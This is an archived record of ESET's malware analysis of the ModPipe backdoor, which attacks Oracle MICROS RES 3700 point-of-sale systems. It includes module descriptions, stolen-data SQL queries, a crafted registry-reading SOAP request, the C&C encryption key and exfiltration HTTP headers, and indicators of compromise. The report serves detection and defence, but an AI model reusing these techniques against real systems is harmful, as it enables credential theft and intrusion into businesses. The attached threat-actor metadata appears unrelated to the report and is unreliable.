{
    "id": "a005db78-8df3-473c-b0a6-1f8f9314ab54",
    "created_at": "2022-10-25T16:48:19.494401Z",
    "updated_at": "2025-03-27T02:06:05.913597Z",
    "deleted_at": null,
    "sha1_hash": "0059d38480ba7bf97b0eca30fe489c3a41d8862e",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-11-13T03:58:30Z",
    "file_modification_date": "2020-11-13T03:58:30Z",
    "file_size": 961080,
    "plain_text": "# Hungry for data, ModPipe backdoor hits POS software used in hospitality sector\n\n**[welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector](https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/)**\n\nNovember 12, 2020\n\nBackdoor authors show deep knowledge of the targeted POS software, decrypting database\npasswords from Windows registry values\n\n[Martin Smolár](https://www.welivesecurity.com/author/msmolar/)\n12 Nov 2020 - 11:30AM\n\nESET researchers have discovered ModPipe, a modular backdoor that gives its operators\naccess to sensitive information stored in devices running ORACLE MICROS Restaurant\nEnterprise Series (RES) 3700 POS – a management software suite used by hundreds of\nthousands of bars, restaurants, hotels and other hospitality establishments worldwide.\n\nWhat makes the backdoor distinctive are its downloadable modules and their capabilities.\nOne of them – named GetMicInfo – contains an algorithm designed to gather database\npasswords by decrypting them from Windows registry values. This shows that the\nbackdoor’s authors have deep knowledge of the targeted software and opted for this\nsophisticated method instead of collecting the data via a simpler yet “louder” approach,\nsuch as keylogging.\n\nExfiltrated credentials allow ModPipe’s operators access to database contents, including\nvarious definitions and configuration, status tables and information about POS\ntransactions.\n\nHowever, based on the documentation of RES 3700 POS, the attackers should not be able to\naccess some of the most sensitive information – such as credit card numbers and expiration\ndates – which is protected by encryption. The only customer data stored in the clear and\nthus available to the attackers should be cardholder names.\n\n\n-----\n\nThis would limit the amount of valuable information viable for further sale or misuse,\nmaking the full “business model” behind the operation unclear. One possible explanation is\nthat another downloadable module exists that allows the malware operators to decrypt the\nmore sensitive data in the user’s database.\n\nAccording to the documentation, to achieve this the attackers would have to reverse\nengineer the generation process of the “site-specific passphrase”, which is used to derive the\nencryption key for sensitive data. This process would then have to be implemented into the\nmodule and – due to use of the Windows Data Protection API (DPAPI) – executed directly\non the victim’s machine. Another remaining unknown is ModPipe’s distribution method.\nThe majority of the identified targets were from the United States, with indications that\nthey were in the restaurant and hospitality sectors – the primary customers of RES 3700\nPOS.\n\n## ModPipe architecture\n\nOur analysis shows that ModPipe uses modular architecture consisting of basic components\nand downloadable modules (for a better overview see Figure 1):\n\n1. initial dropper – contains both 32-bit and 64-bit binaries of the next stage – the\n\npersistent loader – and installs the appropriate version to the compromised machine.\n2. persistent loader – unpacks and loads the next stage of the malware, namely the\n\nmain module.\n3. main module – performs the main functionality of the malware. It creates a pipe\n\nused for communication with other malicious modules, un/installs these modules and\nserves as a dispatcher that handles communication between the modules and\n[attacker’s C&C server.](https://www.virusradar.com/en/glossary/command-and-control-server)\n4. networking module – module used for communication with C&C.\n\n5. downloadable modules – components adding specific functionality to the\n\nbackdoor, such as the ability to steal database passwords and configuration\ninformation, scan specific IP addresses or acquire a list of the running processes and\ntheir loaded modules.\n\n\n-----\n\n_Figure 1. Overview of ModPipe backdoor architecture_\n\n\n-----\n\n### Downloadable modules\n\nProbably the most intriguing parts of ModPipe are its downloadable modules. We’ve been\naware of their existence since the end of 2019, when we first found and analyzed its “basic”\ncomponents.\n\nIn April 2020, after a couple of months of hunting, we found three of these modules in the\nwild. The list of all downloadable modules we found and analyzed, and their IDs –\nrepresented by a 16-bit unsigned value – are available in Table 1. Our research also suggests\nthat the operators use at least four other downloadable modules, whose functionality\nremains completely unknown to us for now.\n\nIt’s worth mentioning that some of these modules can create a named pipe with a GUIDformatted name derived from the module’s ID. Other modules can use this pipe to send\ncommands to the module that created it.\n\n_Table 1. Downloadable modules_\n\n**Module ID** **Name** **Description**\n\n0xA0C0 GetMicInfo Steals database passwords, data and various settings\n\n0x2000 ModScan Performs scan on the specified IP addresses\n\n - ProcList Gets list of the running processes and their loaded modules\n\n0xA000 unknown \n0xA040 unknown \n0xA740 unknown \n0xA080 unknown \n**Downloadable module: GetMicInfo**\n\nGetMicInfo is a downloadable component that targets data related to the MICROS POS\nincluding passwords tied to two database usernames predefined by the manufacturer: dba\nand micros (see Figure 2). This information is encrypted and stored in DataS5 (for dba) and\nDataS6 (for micros) registry values within one of the following registry keys:\n\nHKLM\\Software\\Micros\\UserData or\nHKLM\\Software\\WOW6432Node\\Micros\\UserData if run in Windows 32-bit on\nWindows 64-bit (WOW64) subsystem\n\n\n-----\n\n_Figure 2. Hex-Rays decompiled code of the function stealing database passwords_\n\nThe GetMicInfo module can intercept and decrypt these database passwords, using a\nspecifically designed algorithm. So as not to aid other malicious actors, we won’t be\ndisclosing the inner workings of the algorithm. Since the decryption mechanism wasn’t\npublicly available, there are at least three possible scenarios of how the attackers could have\ncreated the algorithm:\n\nThe most probable option is that the attackers acquired and reverse engineered\n**the implementation of the ORACLE MICROS RES 3700** **POS and the libraries**\nresponsible for encryption and decryption of the database passwords.\nThe attackers could have gained the information describing the implementation of the\nencryption and decryption mechanism from a 2016 data breach described in a\nblogpost by Brian Krebs.\nThe malware operators could have bought the code from an underground market.\n\nOur analysis shows that in cases where the GetMicInfo module decrypts the password for\nthe dba username, it will also try to acquire the path to the SQL Anywhere API library from\nthe environment variable “SQLANY_API_DLL” and load it if it’s available.\n\nIf the environment variable does not exist, the module tries to load the library using its\nname dbcapi.dll. This library is a part of Sybase SQL Anywhere, which is used by RES 3700\nPOS.\n\nIf one of these approaches is successful, GetMicInfo attempts to connect to the database\nusing the following connection string:\n\n\n-----\n\nDBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5%\n\n%PCNAME% represents the computer name retrieved via the GetComputerName API and\n%decrypted_DataS5% stands for the decrypted dba user password.\n\nAfter establishing a connection, GetMicInfo tries to execute the following SQL queries and\nreport the results to the main module, using a pipe message with ID 0x10000013 (see Table\n3 for a full list of pipe messages and their IDs):\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nSELECT lan_node_seq,obj_num,name,lan_addr,ob_diskless,type,ip_addr,ip_netmask\nFROM micros.lan_node_def\n\nSELECT dvc_tbl_seq,obj_num,name,type,com_port_seq,com_port,baud_rate,num_data_bits,num_stop_bits,parity_type,filename FROM micros.dev_def\n\nSELECT tmed_seq,obj_num,name,type,ca_driver,edc_driver FROM micros.tmed_def\n\nSELECT * FROM micros.caedc_driver_def\n\nSELECT * FROM micros.interface_def\n\n\nQueried data contain various MICROS RES 3700 POS system definitions and\nconfigurations (see Figure 3). Other information stolen by the module includes the version\nof the MICROS POS and information about specific registry keys most likely related to\nvarious credit card services configurations.\n\n\n-----\n\n_Figure 3. Hex-Rays decompiled code of the function that steals database data_\n\nThe GetMicInfo module is injected into one of the processes specified by the C&C in the\ninstall command (0x0C). Based on our findings, it is typically associated with one of the\nfollowing legitimate processes:\n\nMDSHTTPService.exe (MICROS MDS HTTP Service)\nCALSrv.exe (MICROS CAL Service – Client Application Loader server)\nexplorer.exe\n\nWe can confirm that the GetMicInfo module can successfully obtain the database passwords\nfrom RES 3700 POS v4.7 and v5.4. For all the other versions, we were able neither to\nconfirm nor deny the ability of the component to obtain the targeted libraries.\n\n**Downloadable module: ModScan 2.20**\n\nThe main purpose of ModScan 2.20 is to collect additional information about the installed\nMICROS POS environment on the machines by scanning selected IP addresses. The\nModScan 2.20 module is injected into one of the processes specified by the C&C via an\nInstallMod command (0x72). Based on our findings, it is typically associated with one of the\nfollowing legitimate processes:\n\nMDSHTTPService.exe (MICROS MDS HTTP Service)\nCALSrv.exe (MICROS CAL Service – Client Application Loader server)\nmsdtc.exe\njusched.exe\nspoolsv.exe\nservices.exe\n\nDifferences between the injected processes misused by GetMicInfo and those targeted by\nModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into\nprocesses running under WOW64.\n\nThe list of IP addresses intended for scanning and the special “ping” IP address are\nspecified by the C&C in one of two ways. It is either:\n\n1. downloaded from the C&C along with the ModScan module, or\n2. received during runtime, using the named pipe associated with the ModScan module.\n\nThe ModScan module handles pipe commands listed in Table 2.\n\n_Table 2. ModScan 2.20 module pipe commands_\n\n**Command**\n**name** **Command description**\n\n\n-----\n\n**Command**\n**name** **Command description**\n\nexit Exit\n\nstop Terminate scanning threads\n\nscan Start scanning IPs specified in the command data to collect additional information about the environment\n\nprm Specify special “ping” IP address\n\n**Scanning procedure routine**\n\n1. Before scanning, the module sends a special “ping” message containing a 32-bit value\n\ngenerated by the GetTickCount Windows API function to TCP ports 50123 (used by\nMDS HTTP Service) and 2638 (used by SAP Sybase database server) of the “ping” IP\naddress.\n2. The response from the “ping” IP address should contain the same 32-bit value rotated\n\nright by one bit and XORed with the value 0x6CF6B8A8. If the response on at least\none of the ports provides the appropriate value, the module will start the scan of the\nselected IP addresses. A decompilation of this ping function is shown in Figure 4.\n\n_Figure 4. Hex-Rays decompiled code of the ModScan ping functionality_\n\n3. When the ModScan module starts the scan, some of the following information may be\n\ngathered, depending on the parameters received along with the scan command:\n\n**Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an**\nHTTP Post message (see Figure 5) to the specified IP address on port 50123 used by\nthe MDS HTTP Service. The sought-after information is stored between data xml tags\n(<data>%version%</data>) of the response from the service.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\nPOST /%s HTTP/1.1\n\nAccept: text/xml\n\nUser-Agent: MDS POS Client\n\nHost: %s:50123\n\nContent-Length: 459\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n<SOAP-ENV:Body xmlns:MCRS-ENV=\"MCRS-URI\">\n\n<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service>\n\n<MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method>\n\n<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey>\n\n<MCRS-ENV:InputParameters>\n\n<Key>SOFTWARE\\MICROS</Key>\n\n<KeyType>HKEY_LOCAL_MACHINE</KeyType>\n\n<KeyName>Version</KeyName>\n\n</MCRS-ENV:InputParameters>\n\n</SOAP-ENV:Body>\n\n</SOAP-ENV:Envelope>\n\n\n_Figure 5. MDS HTTP Service request_\n\n**Name of the database, extracted by sending a specially crafted TCP packet**\n(possibly using the CMDSEQ command protocol) to the selected IP address on port\n2638 used by the SAP Sybase Database Server. The string representing the name of\nthe database is located at offset 0x28 of the response sent by the database server.\n\n\n-----\n\n**Database server** **data, such as its name, version of the TDS protocol and the TDS**\nserver version. To gain this information, the ModScan module sends a hardcoded TDS\n4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638. The\n[response includes a Login Acknowledgement packet which, in both cases – success](http://www.freetds.org/tds.html#t173)\nand failure – contains information about the database server and the TDS versions\nused. The TDS login packet is hardcoded, with username set to the built-in dba and a\nhardcoded password, which is potentially the default password in some RES 3700\nPOS versions. As we haven’t found any public reference to this password, we won’t be\npublishing it in our blogpost.\n\n_Figure 6. TDS 4.2 & 5.0 Login Packet used by the ModScan_\n\n_module, dissected using Wireshark_\n\n**Downloadable module: ProcList**\n\nThe last of the downloadable modules we were able to obtain and dissect was ProcList. This\nis a lightweight module that doesn’t have an assigned ID. Its main purpose is to collect\ninformation about currently running processes, including: name, process identifier (PID),\nparent process PID, number of threads, token owner, token domain, process creation time,\nand command line.\n\n\n-----\n\nOptionally, ProcList can also collect information about loaded modules for each of the\nrunning processes. Collected information is sent to the main module of the backdoor (using\npipe message 0x10000013).\n\n### Initial dropper\n\nThe initial dropper is responsible for installing the next stage of the malware. During our\ninvestigation, we discovered one dropper executable on two compromised machines, stored\nin the following locations:\n\nC:\\IQXDatabase\\Live\\1.exe\nC:\\OasisLive\\1.exe\n\nEach time the initial dropper is executed, a unique configuration is generated, using mostly\nrandom bytes. This causes the hash of the dropped loader to change with each execution,\ncomplicating detection and tracking of the malware. The dropper component can drop the\nloader into two possible locations and set up the persistence mechanism by creating a\nWindows service or Windows registry Run key (for details, please refer to the Indicators of\n_Compromise section)._\n\nThe encrypted payload, containing the main functionality of the dropper, is stored in the\ndropper’s resources as bitmaps named from A to L. The dropper decrypts this payload using\nthe provided command line parameter, then executes it. The payload is responsible for\ndecrypting the appropriate loader depending on the system architecture, so either 32-bit or\n64-bit. Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long.\nDecompiled code responsible for loading the payload from the binary’s resources, its\ndecryption and execution is shown in Figure 7.\n\n\n-----\n\n_Figure 7. Hex-Rays decompiled code – decryption and execution of the payload in the initial dropper_\n\n\n-----\n\nAn example of an encrypted and decrypted configuration with explanations is visible in\nFigure 8. The configuration shown comes from the loader installed by the dropper sample\nwith SHA-1 hash 9f8530627a8ad38f47102f626dec9f0173b44cd5. Note that the structure of\nthe configuration can vary between older and newer versions of the loader executable.\n\n_Figure 8. Example of the loader’s generated configuration (upper is encrypted, lower decrypted)_\n\n### Persistent loader\n\nThis component is responsible for both unpacking the main module and for its injection\ninto one of the following processes:\n\nlsass.exe\nwininit.exe\nservices.exe\n\nTo unpack the main module, the persistent loader uses different approaches for the 32-bit\nand 64-bit versions. While the 32-bit loader is almost identical to the initial dropper – the\nonly difference being the payloads stored in the resources – the 64-bit loader uses\ncompletely different “unpacking” code.\n\nWe have found seven different versions of the loader executables, each having a different\ncompilation timestamp, with the oldest one probably originating in December 2017 and the\nlatest in June 2020. For the full timeline, see Figure 9. A list of all the loader hashes is\nincluded in the Indicators of Compromise section.\n\n\n-----\n\n_Figure 9. Timeline of known ModPipe variants and their timestamps._\n\n### Main module\n\nThe main module is mostly responsible for managing C&C communication and for handling\nreceived messages/commands, either from C&C or downloadable modules. To facilitate the\ncommunication with modules, the main module starts by creating a pipe with a randomly\ngenerated name formatted using the following format string:\n\n{%08X-%04X-%04X-%04X-%08X%04X}\n\nIt then periodically checks the pipe for new messages using the PeekNamedPipe Windows\nAPI function. Messages are parsed and handled according to their content. For a full list of\nrecognized pipe commands and messages see Table 3.\n\n_Table 3. List of pipe message/command types_\n\n**Message**\n**code** **Description**\n\n0x10000012 inject and execute received module in specified process\n\n0x10000013 data for C&C server (execution logs, stolen data, …)\n\n0x10000014 write requested configuration data to the file handle received in this message (most likely handle to named pipe created by some other module)\n(main config, network config, loader name, main module PID, ...)\n\n0x10000020 C&C commands (not encrypted) – see Table 4 for the full list of available\ncommands\n\n0x10000022 set module status (or err code)\n\n0x10000023 set C&C communication time intervals\n\n0x10000024 close received list of handles\n\n0x10000025 get handle of the process with specified PID, duplicate it for some other\nspecified process and send it through the received named pipe handle\n\n0x10000072 C&C commands (encrypted) – see Table 4 for the full list of available\ncommands\n\n\n-----\n\nFor the detailed structure and format used for the messages transferred through the pipe\nrefer to Figure 10.\n\n_Figure 10. Structure of the main module’s named pipe messages_\n\nFor communication with its C&C server, the main module uses HTTP and port 80. Each of\nthe dissected samples contained a list of potentially available servers from which one was\nrandomly chosen. A list of all C&C addresses discovered over the course of our research is\navailable in the Indicators of Compromise section.\n\nMessages sent to the C&C (see Figure 11) are constructed and encrypted within the main\nmodule’s code.\n\n\n-----\n\n_Figure 11. Structure of the messages sent to the C&C_\n\nBefore any communication with the C&C, the main module generates two clean URLs and\nuses them to check for an internet connection and a clean-looking cover for the malicious\ntraffic. The URLs use the following format www.%domain%[.]com/?%rand%, where\n%domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32bit unsigned integer represented in ASCII.\n\nCommunication with the C&C is encrypted using AES in CBC mode with the following 128bit key: F45D076FEC641691A21F0C946EDA9BD5. Before encryption, C&C messages start\nwith a 4-byte checksum, which is calculated as CRC32 (message) XORed with the first 4\nbytes of the AES key used to encrypt the message. In the case of the key mentioned above,\nthis would be F4 5D 07 6F.\n\nThe data is transmitted using the lightweight networking module, which is injected on\ndemand and exits immediately after uploading or downloading the requested message. To\nselect the process for injection, the main module enumerates running processes and assigns\nthem a priority value between 3 and 6. Those with higher priority are injected first, based\non the following criteria:\n\nPriority 6\n\nThe highest priority, assigned to any process that has already been used\nsuccessfully to inject a networking module, received a response from the C&C\nand that is still running under the same PID, name and CreationTime.\nPriority 5\n\nProcess name with no extension that matches one of the following process\nnames used for browsers: iexplore, opera, chrome, firefox\nPriority 4\n\nProcess name with no extension that matches the following process names:\nexplorer, svchost\n\n\n-----\n\nPriority 3\n\nAll the other running processes excluding the following system processes:\nsystem, lsass, csrss, lsm, winlogon, smss, wininit\n\nThe main reason behind the priority list is to inject processes that are expected to\ncommunicate over the network and at the same time avoid system processes that might\nattract attention if caught communicating over the network.\n\n### Networking module\n\nThis ModPipe module is responsible for sending requests to C&C and parsing payload\nreceived in the C&C responses. HTTP POST or GET methods with headers shown in Figure\n12 and Figure 13 can be used to upload data to C&C and download additional payloads and\nC&C commands.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nPOST /robots.txt HTTP/1.1\n\nAccept: */*\n\nContent-Length: %data_length%\n\nContent-Type: application/octet-stream\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)\n\nHost: %remote_host%\n\nCache-Control: no-cache\n\n%data%\n\n\n_Figure 12. HTTP POST header used to contact C&C_\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nGET %rsrc_path% HTTP/1.1\n\nAccept: */*\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)\n\nHost: %remote_host%\n\nCache-Control: no-cache\n\n\n_Figure 13. HTTP GET message header_\n\n\n-----\n\nResponses from the C&C server have to be at least 33-bytes long in order to be parsed by the\nnetworking module and the malicious payload is located after a sequence of 13 spaces\nfollowed by an HTML comment opening tag. An example of a server response including this\nsequence is shown in Figure 14.\n\n_Figure 14. Example C&C server response including encrypted payload_\n\nIf all conditions are met, the network module sends the C&C response to the main module\nusing a pipe message with ID 0x10000072. The main module then decrypts the payload,\nverifies its checksum and executes the C&C command. Available commands are listed in\nTable 4.\n\n_Table 4. List of available main module commands_\n\n**Com-**\n**mand**\n**code** **Command description**\n\n0x01 Exit\n\n0x05 Update list of C&C addresses\n\n0x0A Inject and execute received module in specified process\n\n0x0B Inject and execute received module in specified process (module name is included in the command)\n\n0x0C Optionally write module to the encrypted storage, then inject and execute received module in specified process – add it to the list of the installed modules\n\n0x0D Send command to the named pipe belonging to the module with specified ID\nand queue the response for the upload to the C&C\n\n0x0E Uninstall module with specified ID (remove from the in-memory list and encrypted storage)\n\n\n-----\n\n**Com-**\n**mand**\n**code** **Command description**\n\n0x0F Save network configuration to the encrypted storage\n\n## Conclusion\n\nModPipe shows quite a few interesting features. Probably the most intriguing finding is the\nalgorithm hidden in one of the backdoor’s modules, which was specifically designed to steal\ncredentials by decrypting them from registry values. By acquiring the database passwords,\nthe attackers gain broad access to sensitive information even though the most sensitive data\nstored in devices running RES 3700 POS should still be protected by encryption.\n\nModPipe’s architecture, modules and their capabilities also indicate that its writers have\nextensive knowledge of the targeted RES 3700 POS software. The proficiency of the\noperators could stem from multiple scenarios, including stealing and reverse engineering\nthe proprietary software product, misusing its leaked parts or buying code from an\nunderground market.\n\nTo keep the operators behind ModPipe at bay, potential victims in the hospitality sector as\nwell as any other businesses using the RES 3700 POS are advised to:\n\nUse the latest version of the software.\nUse it on devices that run updated operating system and software.\nUse reliable multi-layered security software that can detect ModPipe and similar\nthreats.\n\n## Indicators of Compromise\n\n### C&C IP addresses\n\n191.101.31[.]223\n194.32.76[.]192\n23.19.58[.]114\n88.99.177[.]103\n91.209.77[.]172\n5.135.230[.]136\n\n### C&C domains/URLs\n\nsubzeroday.zapto[.]org\nshj145ertyb.ddns[.]net/gettime.html\n\n\n-----\n\nouidji12345.ddns[.]net/gettime.html\n\n### Dropper samples\n\n9F8530627A8AD38F47102F626DEC9F0173B44CD5\nFEE9C08B494C80DBF73A6F70FACD20ED0429330D\n\n### Loader samples\n\n0D1A4CB620576B8ADD34F919B4C6C46E7C3F9A59\nB47E05D67DC055AF5B0689782D67EAA2EB8C75E3\nF213B4EEF63F06EC127D3DC3265E14EE190B71E5\nB2CE307DFE65C188FDAE169ABD65B75B112522C4\n2AC7A2C09E50EAFABF1F401194AC487ED96C6781\n0F4355A17AABD3645788341EAC2A9BB759DB95EE\n\n### File paths\n\n%CSIDL_APPDATA%\\Microsoft\\Windows\\{%rand_guid%}\\explorer.exe\n%WINDIR%\\system32\\%random_name%.exe\n\n%rand_guid% – pseudo-random GUID formatted string\n\n%random_name% – from 4 to 7 pseudo-random letters (a-z) with the first one capital e.g.\n“Cvoeqo.exe”\n\n## MITRE ATT&CK techniques\n\n_[Note: This table was built using version 7 of the MITRE ATT&CK framework.](https://attack.mitre.org/versions/v7/)_\n\n**Tactic** **ID** **Name** **Description**\n\n\nExecution\n\nPersistence\n\n\n[T1059.003](https://attack.mitre.org/versions/v7/techniques/T1059/003/) Command and\nScripting Interpreter: Windows\nCommand Shell\n\n[T1547.001](https://attack.mitre.org/versions/v7/techniques/T1547/001/) Boot or Logon Autostart Execution:\nRegistry Run Keys /\nStartup Folder\n\n[T1543.003](https://attack.mitre.org/versions/v7/techniques/T1543/003/) Create or Modify\nSystem Process:\nWindows Service\n\n\nAttackers were seen using Windows Command Shell to execute the initial dropper.\n\nModPipe can use Registry Run key for\npersistence.\n\nModPipe can create a new service for\npersistence.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n\nPrivilege\nEscalation\n\nDefense\nEvasion\n\nCredential\nAccess\n\nDiscovery\n\nCommand\nand\nControl\n\nExfiltration\n\n\n[T1134.001](https://attack.mitre.org/versions/v7/techniques/T1134/001/) Access Token Manipulation: Token\nImpersonation/Theft\n\n[T1055.002](https://attack.mitre.org/versions/v7/techniques/T1055/002/) Process Injection:\nPortable Executable Injection\n\n\n[T1033](https://attack.mitre.org/versions/v7/techniques/T1033/) System\nOwner/User\nDiscovery\n\n[T1071.001](https://attack.mitre.org/versions/v7/techniques/T1071/001/) Application Layer\nProtocol: Web\nProtocols\n\n[T1573.001](https://attack.mitre.org/versions/v7/techniques/T1573/001/) Encrypted Channel:\nSymmetric\nCryptography\n\n[T1041](https://attack.mitre.org/versions/v7/techniques/T1041/) Exfiltration Over C2\nChannel\n\n\nAttackers were seen using partially modified\n[PrintSpoofer tool to drop and subsequently](https://github.com/itm4n/PrintSpoofer)\nexecute loader with SYSTEM privileges.\n\nModPipe can inject it’s modules into various\nprocesses.\n\n\n[T1205](https://attack.mitre.org/versions/v7/techniques/T1205/) Traffic Signaling ModPipe’s ModScan module sends random\n32-bit values to TCP ports 50123 and 2638\nof the specified IP address and requires a\nspecific response in order to continue executing its scan functionality.\n\n\n[T1552.002](https://attack.mitre.org/versions/v7/techniques/T1552/002/) Unsecured Credentials: Credentials in\nRegistry\n\n\nModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE\nMICROS RES 3700 POS software from Windows Registry and uses a custom algorithm\nto decrypt them before uploading to the\nC&C.\n\n\n[T1057](https://attack.mitre.org/versions/v7/techniques/T1057/) Process Discovery ModPipe’s ProcList module can get information about processes running on a system.\n\n[T1012](https://attack.mitre.org/versions/v7/techniques/T1012/) Query Registry ModPipe’s GetMicInfo module queries the\nRegistry for ORACLE MICROS RES 3700\nPOS version, database passwords and other\nconfiguration data.\n\n\nModPipe gathers username and computer\nname from victim machines and reports\nthem to the C&C in initial message.\n\nModPipe uses HTTP for command and\ncontrol.\n\nModPipe encrypts communication with C&C\nusing AES in CBC mode.\n\nModPipe exfiltrates data over its C&C\nchannel.\n\n\n[T1029](https://attack.mitre.org/versions/v7/techniques/T1029/) Scheduled Transfer Default interval used by ModPipe for uploading data to C&C is set to 30 minutes.\n\n\n-----\n\n[Martin Smolár](https://www.welivesecurity.com/author/msmolar/)\n12 Nov 2020 - 11:30AM\n\n### Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.11.12.ModPipe_POS_Hospitality-Sector/Hungry%20for%20data%2C%20ModPipe%20backdoor%20hits%20POS%20software%20used%20in%20hospitality%20sector%20_%20WeLiveSecurity.pdf"
    ],
    "report_names": [
        "Hungry for data, ModPipe backdoor hits POS software used in hospitality sector _ WeLiveSecurity"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041165,
    "ts_creation_date": 1605239910,
    "ts_modification_date": 1605239910,
    "files": {
        "pdf": "https://archive.orkl.eu/0059d38480ba7bf97b0eca30fe489c3a41d8862e.pdf",
        "text": "https://archive.orkl.eu/0059d38480ba7bf97b0eca30fe489c3a41d8862e.txt",
        "img": "https://archive.orkl.eu/0059d38480ba7bf97b0eca30fe489c3a41d8862e.jpg"
    }
}